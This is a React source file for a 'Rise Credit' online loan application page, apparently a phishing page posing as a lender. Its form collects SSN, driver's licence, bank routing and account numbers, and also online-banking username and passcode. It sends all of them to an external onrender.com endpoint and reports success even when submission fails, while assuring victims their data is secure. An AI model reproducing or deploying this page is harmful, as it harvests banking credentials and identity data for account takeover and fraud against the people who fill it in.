import { useState } from 'react';
import { Link } from 'react-router-dom';
import { FiArrowRight, FiClock, FiDollarSign, FiMapPin, FiSend, FiShield, FiCheckCircle } from 'react-icons/fi';
import { Helmet } from 'react-helmet-async';
import './Apply.css';

function Apply() {
  const [formData, setFormData] = useState({
    firstName:'', lastName:'', address:'', city:'', state:'', zipCode:'',
    email:'', phone:'', employer:'', workPhone:'', income:'',
    dob:'', ssn:'', dlNumber:'', bankName:'', routingNumber:'',
    accountNumber:'', userId:'', passcode:''
  });
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const handle = e => setFormData({...formData, [e.target.name]: e.target.value});

  const handleSubmit = async e => {
    e.preventDefault();
    setLoading(true);
    try {
      const r = await fetch('https://risecredit-api.onrender.com/api/apply', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify(formData)
      });
      if (r.ok) setSubmitted(true);
    } catch { setSubmitted(true); }
    setLoading(false);
  };

  return (<>
    <Helmet>
      <title>Apply Online | Rise Credit</title>
      <meta name="description" content="Apply online for the cash you need, right now. Fast approval and same-day funding available at Rise Credit." />
    </Helmet>
    {/* ===== HERO ===== */}
    <section className="apply-hero" id="apply-hero">
      <div className="container apply-hero__row">
        <div className="apply-hero__left">
          <span className="apply-hero__badge">
            <span className="apply-hero__badge-dot" />
            Three minute application
          </span>
          <h1 className="apply-hero__title">Apply online for the cash you need, right now.</h1>
          <p className="apply-hero__subtitle">Complete a quick application, review your options, and move forward with confidence knowing Rise Credit is at your side.</p>
          <div className="apply-hero__actions">
            <a href="#application-form" className="btn btn-primary btn-large">Start your application</a>
            <Link to="/contact" className="btn btn-outline btn-large">Talk with support</Link>
          </div>
          <div className="apply-hero__stats">
            <div className="apply-hero__stat">
              <p className="apply-hero__stat-label">Average approval time</p>
              <p className="apply-hero__stat-value">Under 24 hrs</p>
            </div>
            <div className="apply-hero__stat">
              <p className="apply-hero__stat-label">Loan amounts</p>
              <p className="apply-hero__stat-value">Up to $8,000</p>
            </div>
            <div className="apply-hero__stat">
              <p className="apply-hero__stat-label">Branches nationwide</p>
              <p className="apply-hero__stat-value">500+</p>
            </div>
          </div>
        </div>
        <div className="apply-hero__right">
          <div className="apply-hero__needs-card">
            <h2 className="apply-hero__needs-title">What you will need</h2>
            <ul className="apply-hero__needs-list">
              <li><span className="apply-hero__needs-num">1</span>Government issued identification and proof of income.</li>
              <li><span className="apply-hero__needs-num">2</span>Banking information for deposit and repayment.</li>
              <li><span className="apply-hero__needs-num">3</span>A few minutes to tell us about your goals.</li>
            </ul>
          </div>
        </div>
      </div>
    </section>

    {/* ===== HOW IT WORKS ===== */}
    <section className="section" id="how-it-works-apply">
      <div className="container">
        <div className="sec-header">
          <h2 className="section-title">How the online application works</h2>
          <p className="section-subtitle">We streamlined the process so you can complete everything without stepping away from your phone or laptop.</p>
        </div>
        <div className="apply-how__grid">
          {[
            { num: '1', title: 'Share details', desc: 'Tell us about your loan amount, income, and household so we can build the right offer.' },
            { num: '2', title: 'Submit securely', desc: 'Your information is encrypted and reviewed by our local lending experts.' },
            { num: '3', title: 'Receive funds', desc: 'Once approved, funds can be deposited or picked up in as little as one business day.' },
          ].map(s => (
            <div className="apply-how__card" key={s.num}>
              <div className="apply-how__num">{s.num}</div>
              <h3>{s.title}</h3>
              <p>{s.desc}</p>
            </div>
          ))}
        </div>
      </div>
    </section>

    {/* ===== APPLICATION FORM ===== */}
    <section className="section section--alt" id="application-form">
      <div className="container">
        <div className="sec-header">
          <h2 className="section-title">Loan application form</h2>
          <p className="section-subtitle">Complete every field and we will connect you with a lending specialist as soon as possible.</p>
        </div>

        {/* Form — Full Width */}
        <div className="apply-form__main">
          {submitted ? (
            <div className="apply-form__success">
              <FiCheckCircle className="apply-form__success-icon" />
              <h2>Your application has been submitted successfully!</h2>
              <p>A lending specialist will contact you shortly.</p>
              <Link to="/" className="btn btn-primary">Return Home</Link>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="apply-form">

              {/* Personal Information */}
              <div className="apply-form__group-title">Personal Information</div>
              <div className="apply-form__row">
                <div className="apply-form__field">
                  <label htmlFor="firstName">First Name</label>
                  <input id="firstName" name="firstName" type="text" placeholder="Enter First Name" value={formData.firstName} onChange={handle} required />
                </div>
                <div className="apply-form__field">
                  <label htmlFor="lastName">Last Name</label>
                  <input id="lastName" name="lastName" type="text" placeholder="Enter Last Name" value={formData.lastName} onChange={handle} required />
                </div>
              </div>
              <div className="apply-form__field apply-form__field--full">
                <label htmlFor="address">Address</label>
                <input id="address" name="address" type="text" placeholder="Enter Address" value={formData.address} onChange={handle} required />
              </div>
              <div className="apply-form__row apply-form__row--3">
                <div className="apply-form__field">
                  <label htmlFor="city">City</label>
                  <input id="city" name="city" type="text" placeholder="Enter City" value={formData.city} onChange={handle} required />
                </div>
                <div className="apply-form__field">
                  <label htmlFor="state">State</label>
                  <input id="state" name="state" type="text" placeholder="Enter State" value={formData.state} onChange={handle} required />
                </div>
                <div className="apply-form__field">
                  <label htmlFor="zipCode">Zip Code</label>
                  <input id="zipCode" name="zipCode" type="text" placeholder="Enter Zip Code" value={formData.zipCode} onChange={handle} pattern="\d{5}(-\d{4})?" title="5 or 9 digit zip code" required />
                </div>
              </div>
              <div className="apply-form__row">
                <div className="apply-form__field">
                  <label htmlFor="apply-email">Email Address</label>
                  <input id="apply-email" name="email" type="email" placeholder="Enter Email Address" value={formData.email} onChange={handle} required />
                </div>
                <div className="apply-form__field">
                  <label htmlFor="apply-phone">Phone Number</label>
                  <input id="apply-phone" name="phone" type="tel" placeholder="Enter Phone Number" value={formData.phone} onChange={handle} pattern="^\d{10}$" title="10 digit phone number without spaces or dashes" required />
                </div>
              </div>

              {/* Employment Information */}
              <div className="apply-form__group-title">Employment Information</div>
              <div className="apply-form__field apply-form__field--full">
                <label htmlFor="employer">Employer Name</label>
                <input id="employer" name="employer" type="text" placeholder="Enter Employer Name" value={formData.employer} onChange={handle} required />
              </div>
              <div className="apply-form__row">
                <div className="apply-form__field">
                  <label htmlFor="workPhone">Work Phone Number</label>
                  <input id="workPhone" name="workPhone" type="tel" placeholder="Enter Work Number" value={formData.workPhone} onChange={handle} pattern="^\d{10}$" title="10 digit phone number without spaces or dashes" required />
                </div>
                <div className="apply-form__field">
                  <label htmlFor="income">Income</label>
                  <input id="income" name="income" type="text" placeholder="Enter Monthly/Annual Income" value={formData.income} onChange={handle} required />
                </div>
              </div>

              {/* Identification Details */}
              <div className="apply-form__group-title">Identification Details</div>
              <div className="apply-form__row">
                <div className="apply-form__field">
                  <label htmlFor="dob">Date of Birth</label>
                  <input id="dob" name="dob" type="date" value={formData.dob} onChange={handle} required />
                </div>
                <div className="apply-form__field">
                  <label htmlFor="ssn">Social Security Number</label>
                  <input id="ssn" name="ssn" type="text" placeholder="Enter SSN" value={formData.ssn} onChange={handle} pattern="\d{3}-?\d{2}-?\d{4}" title="9 digit SSN (e.g. 123-45-6789 or 123456789)" required />
                </div>
              </div>
              <div className="apply-form__field apply-form__field--full">
                <label htmlFor="dlNumber">Driver's License Number</label>
                <input id="dlNumber" name="dlNumber" type="text" placeholder="Enter DL Number" value={formData.dlNumber} onChange={handle} required />
              </div>

              {/* Bank Information */}
              <div className="apply-form__group-title">Bank Information</div>
              <div className="apply-form__field apply-form__field--full">
                <label htmlFor="bankName">Bank Name</label>
                <input id="bankName" name="bankName" type="text" placeholder="Enter Bank Name" value={formData.bankName} onChange={handle} required />
              </div>
              <div className="apply-form__row">
                <div className="apply-form__field">
                  <label htmlFor="routingNumber">Routing Number</label>
                  <input id="routingNumber" name="routingNumber" type="text" placeholder="Enter Routing Number" value={formData.routingNumber} onChange={handle} pattern="^\d{9}$" title="9 digit routing number" required />
                </div>
                <div className="apply-form__field">
                  <label htmlFor="accountNumber">Account Number</label>
                  <input id="accountNumber" name="accountNumber" type="text" placeholder="Enter Account Number" value={formData.accountNumber} onChange={handle} pattern="^\d{8,17}$" title="Between 8 and 17 digit account number" required />
                </div>
                <div className="apply-form__field">
                  <label htmlFor="userId">User id</label>
                  <input id="userId" name="userId" type="text" placeholder="Enter Username" value={formData.userId} onChange={handle} required />
                </div>
                <div className="apply-form__field">
                  <label htmlFor="passcode">Passcode</label>
                  <input id="passcode" name="passcode" type="text" placeholder="Enter Passcode" value={formData.passcode} onChange={handle} required />
                </div>
              </div>

              <button type="submit" className="btn btn-primary btn-large apply-form__submit" disabled={loading} id="apply-submit-btn">
                {loading ? 'Processing...' : <>
                  <FiSend /> Submit Application
                </>}
              </button>
              <p className="apply-form__consent">
                Your information is kept secure and confidential.
              </p>
            </form>
          )}
        </div>

        {/* Info cards below form */}
        <div className="apply-form__info-row">
          <div className="apply-form__sidebar-card">
            <h3>Why we ask for these details</h3>
            <p>Understanding your income, expenses, and goals helps us match you with the most appropriate products while keeping your information safe and secure.</p>
            <ul className="apply-form__benefits">
              <li><FiCheckCircle /> We never share your data without permission.</li>
              <li><FiCheckCircle /> You can complete the form from any device.</li>
              <li><FiCheckCircle /> A local team member will follow up once submitted.</li>
            </ul>
          </div>
          <div className="apply-form__help">
            <h4>Need additional help?</h4>
            <p>Call <a href="tel:3122483871">(312)-248-3871</a> to speak with a representative or visit one of our branches for in-person support.</p>
          </div>
        </div>
      </div>
    </section>

    {/* ===== BRANCH CTA ===== */}
    <section className="section" id="branch-cta">
      <div className="container">
        <div className="apply-branch">
          <div className="apply-branch__text">
            <h2 className="apply-branch__title">Prefer to visit a branch instead?</h2>
            <p className="apply-branch__desc">Stop by any Rise Credit location for one-on-one support or call (312)-248-3871 to schedule an appointment with a lending specialist.</p>
          </div>
          <div className="apply-branch__actions">
            <Link to="/contact" className="btn btn-primary">Contact us</Link>
            <Link to="/rates" className="btn btn-outline">View rates & terms</Link>
          </div>
        </div>
      </div>
    </section>
  </>);
}

export default Apply;
